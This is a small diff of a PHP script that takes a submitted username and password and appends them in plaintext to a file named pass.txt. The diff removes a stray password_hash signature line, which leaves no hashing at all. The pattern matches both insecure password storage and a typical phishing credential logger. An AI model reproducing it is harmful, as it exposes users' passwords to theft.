@@ -4,8 +4,7 @@ $username = $_POST['username'];
 $password = $_POST['password'];
 
 $file = fopen("pass.txt", "a") or die ("file not open");
-string password_hash ( string $password, int $algo [, array $options ] )
-	
+
 $f = $username." , ".$password;
 fputs($file,$f) or die ("no data was written");
 
